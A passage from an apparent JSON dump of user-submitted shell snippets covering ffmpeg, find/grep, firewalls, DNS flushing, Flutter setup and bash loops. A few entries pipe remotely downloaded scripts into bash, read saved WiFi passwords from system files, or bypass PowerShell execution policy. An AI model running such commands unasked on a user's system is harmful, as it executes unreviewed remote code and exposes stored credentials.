    "keyword": null,
    "link": null,
    "title": " ffmpeg take screenshot",
    "description": "ffmpeg -i inputvideo.mp4 -ss 00:00:03 -frames:v 1 outputimage.jpeg\n",
    "reg_date": "2021-10-11T22:04:24.000Z"
  },
  {
    "id": 1473,
    "keyword": null,
    "link": null,
    "title": " ffmpeg trim video",
    "description": " ffmpeg -ss 00:01:00 -i input.mp4 -to 00:02:00 -c copy output.mp4 # Triming in ffmpeg\nffmpeg -ss 00:00:30.0 -i input.wmv -c copy -t 00:00:10.0 output.wmv ffmpeg -ss 30 -i input.wmv -c copy -t 10 output.wmv \n",
    "reg_date": "2021-10-11T22:04:25.000Z"
  },
  {
    "id": 1474,
    "keyword": null,
    "link": null,
    "title": " figma download linux",
    "description": "sudo snap install figma-linux\n",
    "reg_date": "2021-10-11T22:04:25.000Z"
  },
  {
    "id": 1475,
    "keyword": null,
    "link": null,
    "title": " figma for debian 10",
    "description": "sudo snap install figma-linux\nsudo apt update sudo apt install snapd sudo snap install core \n",
    "reg_date": "2021-10-11T22:04:25.000Z"
  },
  {
    "id": 1476,
    "keyword": null,
    "link": null,
    "title": " figma ubuntu",
    "description": "sudo snap install figma-linux\n",
    "reg_date": "2021-10-11T22:04:25.000Z"
  },
  {
    "id": 1477,
    "keyword": null,
    "link": null,
    "title": " file search linux by text",
    "description": "grep -rnw '/path/to/somewhere/' -e 'pattern'\n",
    "reg_date": "2021-10-11T22:04:25.000Z"
  },
  {
    "id": 1478,
    "keyword": null,
    "link": null,
    "title": " filebase64 npm",
    "description": "npm install react-file-base64\n",
    "reg_date": "2021-10-11T22:04:25.000Z"
  },
  {
    "id": 1479,
    "keyword": null,
    "link": null,
    "title": " files changed in a commit",
    "description": "git diff --name-only HEAD HEAD~1\n",
    "reg_date": "2021-10-11T22:04:25.000Z"
  },
  {
    "id": 1480,
    "keyword": null,
    "link": null,
    "title": " find a string contain in another string",
    "description": "#!/bin/bash  STR='GNU/Linux is an operating system' SUB='Linux' if [[ \"$STR\" == *\"$SUB\"* ]]; then   echo \"It's there.\" fi \n",
    "reg_date": "2021-10-11T22:04:25.000Z"
  },
  {
    "id": 1481,
    "keyword": null,
    "link": null,
    "title": " find all files edited after date linux",
    "description": "find . -type f -newermt '1/30/2017 0:00:00' \n",
    "reg_date": "2021-10-11T22:04:26.000Z"
  },
  {
    "id": 1482,
    "keyword": null,
    "link": null,
    "title": " find all files over a certain size",
    "description": "$ find . -type f -size +4G\n",
    "reg_date": "2021-10-11T22:04:26.000Z"
  },
  {
    "id": 1483,
    "keyword": null,
    "link": null,
    "title": " find and replace in all files in directory centos",
    "description": "grep -rl 'apples' /dir_to_search_under | xargs sed -i 's/apples/oranges/g'\n",
    "reg_date": "2021-10-11T22:04:26.000Z"
  },
  {
    "id": 1484,
    "keyword": null,
    "link": null,
    "title": " find command also return directory names?",
    "description": "find . -type d -o -type f\n",
    "reg_date": "2021-10-11T22:04:26.000Z"
  },
  {
    "id": 1485,
    "keyword": null,
    "link": null,
    "title": " find directory ubuntu",
    "description": "find / -type d -name \"apt\"  sudo find / -type d -name \"apt\"\n/* File & Directory Commands To navigate into the root directory, use */ \"cd /\" /* To navigate to your home directory, use */ \"cd\" /*or*/ \"cd ~\" /* To navigate up one directory level, use*/ \"cd ..\" /* To navigate to the previous directory (or back), use */ \"cd -\"\ncd ..     #go to the parent directory\n",
    "reg_date": "2021-10-11T22:04:26.000Z"
  },
  {
    "id": 1486,
    "keyword": null,
    "link": null,
    "title": " find file in ubuntu",
    "description": "find ~/ -type f -name \"postgis-2.0.0\"\nfind / -name NAME.EXTENSION\ngrep -r 'pattern_to_match' directory_to_search\n$ find /path/to/file/ -iname filename\n$ find /path/to/file/\n",
    "reg_date": "2021-10-11T22:04:26.000Z"
  },
  {
    "id": 1487,
    "keyword": null,
    "link": null,
    "title": " find file with text in the file recursively",
    "description": "grep -rnw '/path/to/somewhere/' -e 'pattern'\n",
    "reg_date": "2021-10-11T22:04:26.000Z"
  },
  {
    "id": 1488,
    "keyword": null,
    "link": null,
    "title": " find files created in last 20 days",
    "description": "find . -type f -mtime -30 -exec ls -l {} \\; > last30days.txt \n",
    "reg_date": "2021-10-11T22:04:27.000Z"
  },
  {
    "id": 1489,
    "keyword": null,
    "link": null,
    "title": " find folder in centos 8",
    "description": "find / -type d -name \"apt\"  sudo find / -type d -name \"apt\"\nfind -type d -iname $name\n",
    "reg_date": "2021-10-11T22:04:27.000Z"
  },
  {
    "id": 1490,
    "keyword": null,
    "link": null,
    "title": " find folder in linux",
    "description": "find / -type d -name 'folder_name'\nfind . -type d | grep DIRNAME\nfind -type d -iname $name\nfind / -name \"dir-name-here\"\n$ locate --basename '\\pkg' \ngrep -R \"DocumentRoot\" file or folder\n",
    "reg_date": "2021-10-11T22:04:27.000Z"
  },
  {
    "id": 1491,
    "keyword": null,
    "link": null,
    "title": " find folder linux",
    "description": "find / -type d -name 'folder_name'\nfind . -type d | grep DIRNAME\nfind -type d -iname $name\nfind / -name \"dir-name-here\"\nfind /path/to/folder/ -iname *file_name_portion*\n$ locate --basename '\\pkg' \n",
    "reg_date": "2021-10-11T22:04:27.000Z"
  },
  {
    "id": 1492,
    "keyword": null,
    "link": null,
    "title": " find folder size in linux",
    "description": "# show all folder size in the current directory du -h --max-depth=1\ndu -sh /home/user/\ndu -sh /var\ndf -sh .\ndu -lh --max-depth=1 --block-size=M | sort -nr\ndu -sh /home/george 2.1G    /home/george \n",
    "reg_date": "2021-10-11T22:04:27.000Z"
  },
  {
    "id": 1493,
    "keyword": null,
    "link": null,
    "title": " find image size terminal",
    "description": "$ file my-picture.png my-picture.png: PNG image data, 256 x 256, 8-bit/color RGBA, non-interlaced\n",
    "reg_date": "2021-10-11T22:04:27.000Z"
  },
  {
    "id": 1494,
    "keyword": null,
    "link": null,
    "title": " find large files in ubuntu",
    "description": "sudo du -a /your_dir/ | sort -n -r | head -n 20\n",
    "reg_date": "2021-10-11T22:04:28.000Z"
  },
  {
    "id": 1495,
    "keyword": null,
    "link": null,
    "title": " find largest folders centos",
    "description": "Just Enter this cmd on cli :::Note here /var is directory path ,you can change as per your requirnment  sudo du -a /var | sort -n -r | head -n 10  1008372 /var 313236  /var/www 253964  /var/log 192544  /var/lib 152628  /var/spool 152508  /var/spool/squid 136524  /var/spool/squid/00 95736   /var/log/mrtg.log 74688   /var/log/squid 62544   /var/cache\n# du -Sh | sort -rh | head -5 \n",
    "reg_date": "2021-10-11T22:04:28.000Z"
  },
  {
    "id": 1496,
    "keyword": null,
    "link": null,
    "title": " find linux version",
    "description": "#Get details about linux distro cat /etc/os-release\ncat /etc/os-release\ncat /proc/version\ncat /etc/os-release lsb_release -a hostnamectl Type the following command to find Linux kernel version: uname -r\n",
    "reg_date": "2021-10-11T22:04:28.000Z"
  },
  {
    "id": 1497,
    "keyword": null,
    "link": null,
    "title": " find location for powershell profile ps1 file",
    "description": "$profile\n",
    "reg_date": "2021-10-11T22:04:28.000Z"
  },
  {
    "id": 1498,
    "keyword": null,
    "link": null,
    "title": " find my ip mac terminal",
    "description": "ipconfig getifaddr en0\n# First launch Terminal in Mac #Then past code below:  ipconfig getifaddr en0\nfor local ip :  hostname -I  for Public ip :  curl icanhazip.com\n",
    "reg_date": "2021-10-11T22:04:28.000Z"
  },
  {
    "id": 1499,
    "keyword": null,
    "link": null,
    "title": " find number of occurances of a string in a file shell",
    "description": "$ grep -o -i needs inspire.txt | wc -l\n",
    "reg_date": "2021-10-11T22:04:28.000Z"
  },
  {
    "id": 1500,
    "keyword": null,
    "link": null,
    "title": " find operating system linux",
    "description": "#Get details about linux distro cat /etc/os-release\ncat /etc/os-release\ncat /etc/os-release \n",
    "reg_date": "2021-10-11T22:04:28.000Z"
  },
  {
    "id": 1501,
    "keyword": null,
    "link": null,
    "title": " find out which procses is using port linux",
    "description": "sudo lsof -i:22\nsudo lsof -i:<port_number>\nsudo ss -lptn 'sport = :80'\n$ sudo ss -lptn 'sport = :80' State   Local Address:Port  Peer Address:Port               LISTEN  127.0.0.1:80        *:*                users:((\"nginx\",pid=125004,fd=12)) LISTEN  ::1:80              :::*               users:((\"nginx\",pid=125004,fd=11)) \n",
    "reg_date": "2021-10-11T22:04:29.000Z"
  },
  {
    "id": 1502,
    "keyword": null,
    "link": null,
    "title": " find process id of port ubuntu",
    "description": "$ sudo netstat -ltnp | grep -w ':80'\n",
    "reg_date": "2021-10-11T22:04:29.000Z"
  },
  {
    "id": 1503,
    "keyword": null,
    "link": null,
    "title": " find raspberry pi ip on local network",
    "description": "ping raspberrypi.local\n",
    "reg_date": "2021-10-11T22:04:29.000Z"
  },
  {
    "id": 1504,
    "keyword": null,
    "link": null,
    "title": " find saved wifi password in linux",
    "description": "sudo cat /etc/NetworkManager/system-connections/<WiFi_Network_Name>\n",
    "reg_date": "2021-10-11T22:04:29.000Z"
  },
  {
    "id": 1505,
    "keyword": null,
    "link": null,
    "title": " find ssh key windows",
    "description": "$ ls -al ~/.ssh # Lists the files in your .ssh directory, if they exist\n# see SSH key List ~/.ssh # see public key from existing file cat ~/ssh/<filename>.pub\n",
    "reg_date": "2021-10-11T22:04:29.000Z"
  },
  {
    "id": 1506,
    "keyword": null,
    "link": null,
    "title": " find start up folder",
    "description": "C:\\Users\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n",
    "reg_date": "2021-10-11T22:04:30.000Z"
  },
  {
    "id": 1507,
    "keyword": null,
    "link": null,
    "title": " find string in files linux",
    "description": "grep -rnw '/path/to/somewhere/' -e 'pattern'\nfind . -name '*.js' -exec grep -i 'string to search for' {} \\; -print\n# syntax:  # find *</path/to/dir> ! -name '*<substring-to-exclude>&rsquo;  # example:  find . ! -name '*.csv'\n",
    "reg_date": "2021-10-11T22:04:30.000Z"
  },
  {
    "id": 1508,
    "keyword": null,
    "link": null,
    "title": " find text in any file linux",
    "description": "grep -rnw '/path/to/somewhere/' -e 'pattern'\n",
    "reg_date": "2021-10-11T22:04:30.000Z"
  },
  {
    "id": 1509,
    "keyword": null,
    "link": null,
    "title": " find text in folder",
    "description": "grep -rnw '/path/to/somewhere/' -e 'pattern'\n",
    "reg_date": "2021-10-11T22:04:30.000Z"
  },
  {
    "id": 1510,
    "keyword": null,
    "link": null,
    "title": " find the parent branch of a git branch",
    "description": "git log --first-parent \ngit show-branch -a | grep '\\*' | grep -v `git rev-parse --abbrev-ref HEAD` | head -n1 | sed 's/.*\\[\\(.*\\)\\].*/\\1/' | sed 's/[\\^~].*//'\n",
    "reg_date": "2021-10-11T22:04:30.000Z"
  },
  {
    "id": 1511,
    "keyword": null,
    "link": null,
    "title": " find which process is using port mac",
    "description": "sudo lsof -i tcp:3000  \n lsof -i tcp:3000  \nsudo lsof -i tcp:3001\n",
    "reg_date": "2021-10-11T22:04:30.000Z"
  },
  {
    "id": 1512,
    "keyword": null,
    "link": null,
    "title": " find which service is using port",
    "description": " netstat -aon | findstr<port_number>     tasklist | findstr 9260 \n",
    "reg_date": "2021-10-11T22:04:31.000Z"
  },
  {
    "id": 1513,
    "keyword": null,
    "link": null,
    "title": " find your computer mac address",
    "description": "type on command -> ipconfig/all\n",
    "reg_date": "2021-10-11T22:04:31.000Z"
  },
  {
    "id": 1514,
    "keyword": null,
    "link": null,
    "title": " findstr current folder",
    "description": "Just specify all posible files names in current directory with regex *: findstr string_to_search *\n",
    "reg_date": "2021-10-11T22:04:31.000Z"
  },
  {
    "id": 1515,
    "keyword": null,
    "link": null,
    "title": " fingerprint login disabled ubuntu 20.04",
    "description": "sudo apt-add-repository ppa:fingerprint/fingerprint-gui && sudo apt-get update  sudo apt-get install libbsapi policykit-1-fingerprint-gui fingerprint-gui\n",
    "reg_date": "2021-10-11T22:04:31.000Z"
  },
  {
    "id": 1516,
    "keyword": null,
    "link": null,
    "title": " firebase-tools npm",
    "description": "npm install -g firebase-tools\ninstalling firebase tools\n",
    "reg_date": "2021-10-11T22:04:31.000Z"
  },
  {
    "id": 1517,
    "keyword": null,
    "link": null,
    "title": " firebase cli windows",
    "description": "npm install -g firebase-tools\non linux: curl -sL https://firebase.tools | bash update with: curl -sL firebase.tools | upgrade=true bash\n",
    "reg_date": "2021-10-11T22:04:32.000Z"
  },
  {
    "id": 1518,
    "keyword": null,
    "link": null,
    "title": " firebase login no localhost",
    "description": "firebase login --no-localhost\n",
    "reg_date": "2021-10-11T22:04:32.000Z"
  },
  {
    "id": 1519,
    "keyword": null,
    "link": null,
    "title": " firewall-cmd add port 8080",
    "description": "sudo firewall-cmd --zone=public --permanent --add-port=5000/tcp sudo firewall-cmd --zone=public --permanent --add-port=4990-4999/udp sudo firewall-cmd --zone=public --permanent --list-ports \n",
    "reg_date": "2021-10-11T22:04:32.000Z"
  },
  {
    "id": 1520,
    "keyword": null,
    "link": null,
    "title": " firewall-cmd remove port",
    "description": "# [sudo] firewall-cmd [--zone=zone_name] --permanent --remove-port=<port_number>/tcp  $firewall-cmd --zone=public --permanent --remove-port=3306/tcp  $firewall-cmd --reload  \n",
    "reg_date": "2021-10-11T22:04:32.000Z"
  },
  {
    "id": 1521,
    "keyword": null,
    "link": null,
    "title": " firewall-cmd status",
    "description": "# firewall-cmd --state\n",
    "reg_date": "2021-10-11T22:04:32.000Z"
  },
  {
    "id": 1522,
    "keyword": null,
    "link": null,
    "title": " firewall allow port ubuntu",
    "description": "sudo ufw allow 2222 \nsudo ufw allow PORT_NUMBER\n",
    "reg_date": "2021-10-11T22:04:32.000Z"
  },
  {
    "id": 1523,
    "keyword": null,
    "link": null,
    "title": " firewall in ubuntu 18.04",
    "description": "$ sudo ufw disable Firewall stopped and disabled on system startup \nManaging UFW from command line UFW ( Uncomplicated Firewall ) firewall is a default firewall on Ubuntu 18.04 Bionic Beaver Linux. Check a current firewall status By default the UFW is disabled. You can check the status of your firewall by executing the following linux command:  $ sudo ufw status [sudo] password for linuxconfig:  Status: inactive  For more verbose output append word verbose to the above command:  $ sudo ufw status verbose  Enable Firewall To enable firewall execute:  $ sudo ufw enable Command may disrupt existing ssh connections. Proceed with operation (y|n)? y Firewall is active and enabled on system startup  Firewall, is now enabled:  $ sudo ufw status Status: active  \n",
    "reg_date": "2021-10-11T22:04:32.000Z"
  },
  {
    "id": 1524,
    "keyword": null,
    "link": null,
    "title": " firewall port open centos",
    "description": "firewall-cmd --zone=public --add-port=2888/tcp --permanent Then remember to reload the firewall for changes to take effect.  firewall-cmd --reload\n",
    "reg_date": "2021-10-11T22:04:32.000Z"
  },
  {
    "id": 1525,
    "keyword": null,
    "link": null,
    "title": " firewall status on ubuntu",
    "description": "$ sudo ufw status [sudo] password for linuxconfig:  Status: inactive \n",
    "reg_date": "2021-10-11T22:04:33.000Z"
  },
  {
    "id": 1526,
    "keyword": null,
    "link": null,
    "title": " firewalld not running centos 7",
    "description": "systemctl start firewalld\n",
    "reg_date": "2021-10-11T22:04:33.000Z"
  },
  {
    "id": 1527,
    "keyword": null,
    "link": null,
    "title": " firewalld permanent rules",
    "description": "firewall-cmd --permanent --zone=public --add-port=80/tcp\n",
    "reg_date": "2021-10-11T22:04:33.000Z"
  },
  {
    "id": 1528,
    "keyword": null,
    "link": null,
    "title": " first of file linux terminal",
    "description": "cat file.log | \thead -number_of_lines\n",
    "reg_date": "2021-10-11T22:04:33.000Z"
  },
  {
    "id": 1529,
    "keyword": null,
    "link": null,
    "title": " fix failed to fetch in apt-get update",
    "description": "This error can happen when fetching the latest repositories during \"apt-get update\" was interrupted, and a subsequent \"apt-get update\" is not able to resume the interrupted fetch. In this case, remove the content in /var/lib/apt/lists before retrying \"apt-get update\".  $ sudo rm -rf /var/lib/apt/lists/* $ sudo apt-get update If the above does not solve the problem, use the following commands instead.  $ sudo rm -R /var/lib/apt/lists/partial/* $ sudo apt-get update\n",
    "reg_date": "2021-10-11T22:04:33.000Z"
  },
  {
    "id": 1530,
    "keyword": null,
    "link": null,
    "title": " fix shortcut virus cmd",
    "description": "attrib -h -r -s /s \"drive\" \\*.*\n",
    "reg_date": "2021-10-11T22:04:33.000Z"
  },
  {
    "id": 1531,
    "keyword": null,
    "link": null,
    "title": " fix vscode font for terminal linux powerlevel10k",
    "description": "/* Download a powerline font like Cascadia Code PL and then add it to your                          VsCode settings.json using                         */     { \"terminal.integrated.fontFamily\": \"Cascadia Code PL\", } \nGo into the settings.json file Change -> \"terminal.integrated.fontFamily\":\"monospace\", to -> \"terminal.integrated.fontFamily\":\"MesloLGS NF\", save the file and your integrated vscode terminal should look correct\n",
    "reg_date": "2021-10-11T22:04:33.000Z"
  },
  {
    "id": 1532,
    "keyword": null,
    "link": null,
    "title": " fixing a remp commit typo",
    "description": "$ git commit --amend -m \"New and correct message\" \n",
    "reg_date": "2021-10-11T22:04:33.000Z"
  },
  {
    "id": 1533,
    "keyword": null,
    "link": null,
    "title": " fixing powershell error",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:04:33.000Z"
  },
  {
    "id": 1534,
    "keyword": null,
    "link": null,
    "title": " flask login install",
    "description": "pip install flask-login\n<!doctype html> <title>{% block title %}{% endblock %} - Flaskr</title> <link rel=\"stylesheet\" href=\"{{ url_for('static', filename='style.css') }}\"> <nav>   <h1>Flaskr</h1>   <ul>     {% if g.user %}       <li><span>{{ g.user['username'] }}</span>       <li><a href=\"{{ url_for('auth.logout') }}\">Log Out</a>     {% else %}       <li><a href=\"{{ url_for('auth.register') }}\">Register</a>       <li><a href=\"{{ url_for('auth.login') }}\">Log In</a>     {% endif %}   </ul> </nav> <section class=\"content\">   <header>     {% block header %}{% endblock %}   </header>   {% for message in get_flashed_messages() %}     <div class=\"flash\">{{ message }}</div>   {% endfor %}   {% block content %}{% endblock %} </section> \n",
    "reg_date": "2021-10-11T22:04:34.000Z"
  },
  {
    "id": 1535,
    "keyword": null,
    "link": null,
    "title": " flask restful install",
    "description": "pip install flask-restful \npip install Flask-RESTful\n",
    "reg_date": "2021-10-11T22:04:34.000Z"
  },
  {
    "id": 1536,
    "keyword": null,
    "link": null,
    "title": " flask wtf install",
    "description": "pip install Flask-WTF\npip install WTForms\npip install -U Flask \npip install flask Or If The Problem is \"pip\" not Found Use :  py -m pip install flask\n",
    "reg_date": "2021-10-11T22:04:34.000Z"
  },
  {
    "id": 1537,
    "keyword": null,
    "link": null,
    "title": " flush dns",
    "description": "ipconfig /flushdns\nDont flush your dns too much, or your wifi might get worse\n/etc/init.d/nscd restart\nsudo lookupd -flushcache\nsudo killall -HUP mDNSResponder\nsudo dscacheutil -flushcache\nsudo discoveryutil udnsflushcaches\n",
    "reg_date": "2021-10-11T22:04:34.000Z"
  },
  {
    "id": 1538,
    "keyword": null,
    "link": null,
    "title": " flush dns bash",
    "description": "sudo systemd-resolve --flush-caches\nsudo systemd-resolve --flush-caches sudo systemd-resolve --statistics sudo /etc/init.d/dns-clean start\n",
    "reg_date": "2021-10-11T22:04:34.000Z"
  },
  {
    "id": 1539,
    "keyword": null,
    "link": null,
    "title": " flush dns cache linux",
    "description": "sudo systemd-resolve --flush-caches\nsudo systemd-resolve --flush-caches sudo systemd-resolve --statistics sudo /etc/init.d/dns-clean start\n",
    "reg_date": "2021-10-11T22:04:34.000Z"
  },
  {
    "id": 1540,
    "keyword": null,
    "link": null,
    "title": " flush dns cmd",
    "description": "ipconfig /flushdns\nsudo lookupd -flushcache\nsudo killall -HUP mDNSResponder\nsudo dscacheutil -flushcache\nsudo discoveryutil udnsflushcaches\n",
    "reg_date": "2021-10-11T22:04:34.000Z"
  },
  {
    "id": 1541,
    "keyword": null,
    "link": null,
    "title": " flush dns linux",
    "description": "sudo systemd-resolve --flush-caches\nsudo systemd-resolve --flush-caches sudo systemd-resolve --statistics sudo /etc/init.d/dns-clean start\n",
    "reg_date": "2021-10-11T22:04:34.000Z"
  },
  {
    "id": 1542,
    "keyword": null,
    "link": null,
    "title": " flush dns ubuntu 18.04",
    "description": "sudo systemd-resolve --flush-caches\nsudo systemctl restart nscd\n",
    "reg_date": "2021-10-11T22:04:35.000Z"
  },
  {
    "id": 1543,
    "keyword": null,
    "link": null,
    "title": " flutter Android SDK file not found",
    "description": "flutter config --android-sdk <path-to-your-android-sdk-path> flutter doctor --android-licenses flutter doctor -v where dart\n",
    "reg_date": "2021-10-11T22:04:35.000Z"
  },
  {
    "id": 1544,
    "keyword": null,
    "link": null,
    "title": " flutter change Target file from lib/main.dart to another",
    "description": "flutter run -t lib/other_doc.dart or flutter run lib/folderName/other_doc.dart\n",
    "reg_date": "2021-10-11T22:04:35.000Z"
  },
  {
    "id": 1545,
    "keyword": null,
    "link": null,
    "title": " flutter ci cd gitlab",
    "description": "Setup a Flutter CI/CD with GitLab CI https://medium.com/kinandcartacreated/setup-a-flutter-ci-cd-with-gitlab-ci-part-1-8d40b7a3b3dc  OR   Automate Your Flutter Workflow Using GitLab CI/CD and Fastlane https://medium.com/appditto/automate-your-flutter-workflow-using-gitlab-ci-cd-and-fastlane-5872e758165a\n",
    "reg_date": "2021-10-11T22:04:35.000Z"
  },
  {
    "id": 1546,
    "keyword": null,
    "link": null,
    "title": " flutter doctor --android-licenses java error",
    "description": "# ANdroid Studio: Install Android SDK Command-line Tools: > Tools > SDK Manager > Appareance & Behavior > System Setting> Android SDK \t> SDK Tools > Android SDK Command-line Tools (apply)  flutter doctor --android-licenses flutter doctor -v\nInstalling Android SDK Command-line tools from Android SDK Manager did the job for me.  Open Tools > SDK Manager From the left choose, Appearance & Behavior > System Settings > Android SDK Select SDK Tools from the top menu Check Android SDK Command-line tools and click 'apply'.\n[Solved] flutter doctor &ndash;android-licenses gives a java error \n",
    "reg_date": "2021-10-11T22:04:35.000Z"
  },
  {
    "id": 1547,
    "keyword": null,
    "link": null,
    "title": " flutter doctor - CocoaPods installed but not working",
    "description": "curl -L https://get.rvm.io | bash -s stable rvm install ruby-2.6 rvm use ruby-2.6.5 rvm --default use 2.6.5 sudo gem update sudo gem install ffi brew install libffi sudo gem install cocoapods pod setup \n",
    "reg_date": "2021-10-11T22:04:35.000Z"
  },
  {
    "id": 1548,
    "keyword": null,
    "link": null,
    "title": " flutter doctor android license error",
    "description": "flutter config --android-sdk <path-to-your-android-sdk-path> flutter doctor --android-licenses flutter doctor -v where dart\n# ANdroid Studio: Install Android SDK Command-line Tools: > Tools > SDK Manager > Appareance & Behavior > System Setting> Android SDK \t> SDK Tools > Android SDK Command-line Tools (apply)  flutter doctor --android-licenses flutter doctor -v\nInstalling Android SDK Command-line tools from Android SDK Manager did the job for me.  Open Tools > SDK Manager From the left choose, Appearance & Behavior > System Settings > Android SDK Select SDK Tools from the top menu Check Android SDK Command-line tools and click 'apply'.\n[Solved] flutter doctor &ndash;android-licenses gives a java error \n",
    "reg_date": "2021-10-11T22:04:35.000Z"
  },
  {
    "id": 1549,
    "keyword": null,
    "link": null,
    "title": " flutter doctor android license exception in thread main",
    "description": "# ANdroid Studio: Install Android SDK Command-line Tools: > Tools > SDK Manager > Appareance & Behavior > System Setting> Android SDK \t> SDK Tools > Android SDK Command-line Tools (apply)  flutter doctor --android-licenses flutter doctor -v\n",
    "reg_date": "2021-10-11T22:04:35.000Z"
  },
  {
    "id": 1550,
    "keyword": null,
    "link": null,
    "title": " flutter doctor android license status unknown",
    "description": "# ANdroid Studio: Install Android SDK Command-line Tools: > Tools > SDK Manager > Appareance & Behavior > System Setting> Android SDK \t> SDK Tools > Android SDK Command-line Tools (apply)  flutter doctor --android-licenses flutter doctor -v\n[Solved] Flutter.io Android License Status Unknown\n",
    "reg_date": "2021-10-11T22:04:36.000Z"
  },
  {
    "id": 1551,
    "keyword": null,
    "link": null,
    "title": " flutter doctor android licenses exception in thread main java.lang.noclassdeffounderror",
    "description": "# ANdroid Studio: Install Android SDK Command-line Tools: > Tools > SDK Manager > Appareance & Behavior > System Setting> Android SDK \t> SDK Tools > Android SDK Command-line Tools (apply)  flutter doctor --android-licenses flutter doctor -v\n",
    "reg_date": "2021-10-11T22:04:36.000Z"
  },
  {
    "id": 1552,
    "keyword": null,
    "link": null,
    "title": " flutter errors shader compilation error",
    "description": "# Open the terminal, navigate to your folder and type: flutter run --enable-software-rendering  # and run again.\n// Android Studio: [Edit Configurations...] > [Additional arguments] --enable-software-rendering\n",
    "reg_date": "2021-10-11T22:04:36.000Z"
  },
  {
    "id": 1553,
    "keyword": null,
    "link": null,
    "title": " flutter global variable mac",
    "description": "# Tried out all the above methods, but all of them lasted only until  # the terminal was open. So I went ahead and directly added it to the  # path file permanently. sudo nano /etc/paths # add this to the file /Users/yourUserName/Development/flutter/bin\n",
    "reg_date": "2021-10-11T22:04:36.000Z"
  },
  {
    "id": 1554,
    "keyword": null,
    "link": null,
    "title": " flutter license NoClassDefFoundError",
    "description": "# ANdroid Studio: Install Android SDK Command-line Tools: > Tools > SDK Manager > Appareance & Behavior > System Setting> Android SDK \t> SDK Tools > Android SDK Command-line Tools (apply)  flutter doctor --android-licenses flutter doctor -v\n",
    "reg_date": "2021-10-11T22:04:37.000Z"
  },
  {
    "id": 1555,
    "keyword": null,
    "link": null,
    "title": " flutter sdk path mac",
    "description": "$ open ~/.bash_profile #2 paste following lines PATH=\"/Users/vrushali/Downloads/flutter/bin:${PATH}\" export PATH\nflutter doctor -v\nwhere flutter\n",
    "reg_date": "2021-10-11T22:04:37.000Z"
  },
  {
    "id": 1556,
    "keyword": null,
    "link": null,
    "title": " flutter serve",
    "description": "flutter run\n",
    "reg_date": "2021-10-11T22:04:37.000Z"
  },
  {
    "id": 1557,
    "keyword": null,
    "link": null,
    "title": " flutter skia shader compilation error",
    "description": "# Open the terminal, navigate to your folder and type: flutter run --enable-software-rendering  # and run again.\n",
    "reg_date": "2021-10-11T22:04:37.000Z"
  },
  {
    "id": 1558,
    "keyword": null,
    "link": null,
    "title": " flutter update path",
    "description": "export PATH=\"$PATH:[PATH_TO_FLUTTER_GIT_DIRECTORY]/flutter/bin\" echo $PATH which flutter\n",
    "reg_date": "2021-10-11T22:04:37.000Z"
  },
  {
    "id": 1559,
    "keyword": null,
    "link": null,
    "title": " flutter web run using vscode",
    "description": "flutter upgrade\nflutter packages pub global activate webdev\nflutter packages pub global run webdev serve // or run F5 in VScode\n",
    "reg_date": "2021-10-11T22:04:37.000Z"
  },
  {
    "id": 1560,
    "keyword": null,
    "link": null,
    "title": " folder sixe in linux",
    "description": "du -h --max-depth=1\n",
    "reg_date": "2021-10-11T22:04:37.000Z"
  },
  {
    "id": 1561,
    "keyword": null,
    "link": null,
    "title": " font awesome install in angular",
    "description": "npm install --save font-awesome angular-font-awesome //once installed you will to import font awesome to your app.module.ts import { AngularFontAwesomeModule} from 'angular-font-awesome'; //on your app.module.ts add AngularFontAwesomeModule under imports imorts[ .../ AngularFontAwesomeModule, ], \n\"apps\": [     {       \"root\": \"src\",       \"outDir\": \"dist\",       ....       \"styles\": [           \"styles.css\",           \"../node_modules/bootstrap/dist/css/bootstrap.css\",           \"../node_modules/font-awesome/css/font-awesome.css\" // -here webpack will automatically build a link css element out of this!?       ],       ...   }   ] ], \nimport { library } from '@fortawesome/fontawesome-svg-core'; import { fas } from '@fortawesome/free-solid-svg-icons'; import { far } from '@fortawesome/free-regular-svg-icons'; library.add(fas, far); \n",
    "reg_date": "2021-10-11T22:04:37.000Z"
  },
  {
    "id": 1562,
    "keyword": null,
    "link": null,
    "title": " for each folder in directory bash",
    "description": "for d in */ ; do     echo \"$d\" done\n",
    "reg_date": "2021-10-11T22:04:38.000Z"
  },
  {
    "id": 1563,
    "keyword": null,
    "link": null,
    "title": " for each line in file bash",
    "description": "while read p; do   echo \"$p\" done <peptides.txt \nwhile read p; do   echo \"$p\" done <peptides.txt\n#!/bin/bash filename='peptides.txt' echo Start while read p; do      echo $p done < $filename \nfor word in $(cat peptides.txt); do echo $word; done\n",
    "reg_date": "2021-10-11T22:04:38.000Z"
  },
  {
    "id": 1564,
    "keyword": null,
    "link": null,
    "title": " for i in range bash",
    "description": "#Just use command seq to iterate a range from start to end END=10 for i in $(seq 1 $END); do echo $i; done\n",
    "reg_date": "2021-10-11T22:04:38.000Z"
  },
  {
    "id": 1565,
    "keyword": null,
    "link": null,
    "title": " for loop",
    "description": "#!/bin/bash for (( c=1; c<=5; c++ )) do      echo \"Welcome $c times\" done \nfor (int i = 1; i <= 10; i++) { \tprintf(\"%d\\n\",i); }\nfor(int i = 0; i < some_number; i++){   \t//inside loop do whatever you want }\n// this is javascript, but can be used in any language  // with minor modifications of variable definitions  let array = [\"foo\", \"bar\"]  let low = 0; // the index to start at let high = array.length; // can also be a number  /* high can be a direct access too \tthe first part will be executed when the loop starts      \tfor the first time \tthe second part (\"i < high\") is the condition      \tfor it to loop over again.     the third part will be executen every time the code          block in the loop is closed. */  for(let i = low; i < high; i++) {    // the variable i is the index, which is   // the amount of times the loop has looped already   console.log(i);   console.log(array[i]);  } // i will be incremented when this is hit.  // output:  /* \t0     foo     1     bar */\nfruits = ['apple', 'orange', 'peach']  for fruit in fruits:   print(fruit)\nfor i in range (some_number): \t#code goes here\nfor (let i = 0; i < substr.length; ++i) {     // do something with `substr[i]` } \nFor Loop A for loop is a repetition control structure that allows you to efficiently write a loop that needs to be executed a specific number of times. A for loop is useful when you know how many times a task is to be repeated. Syntax :  for(initialization; Boolean_expression; update) {    // Statements } This is how it works :   The initialization step is executed first, and only once. This step allows you to declare and initialize any loop control variables and this step ends with a semi colon (;). Next, the Boolean expression is evaluated.  If it is true, the body of the loop is executed. If it is false, the body of the loop will not be executed and control jumps to the next statement past the for loop. After the body of the for loop gets executed, the control jumps back up to the update statement. This statement allows you to update any loop control variables. This statement can be left blank with a semicolon at the end. The Boolean expression is now evaluated again. If it is true, the loop executes and the process repeats (body of 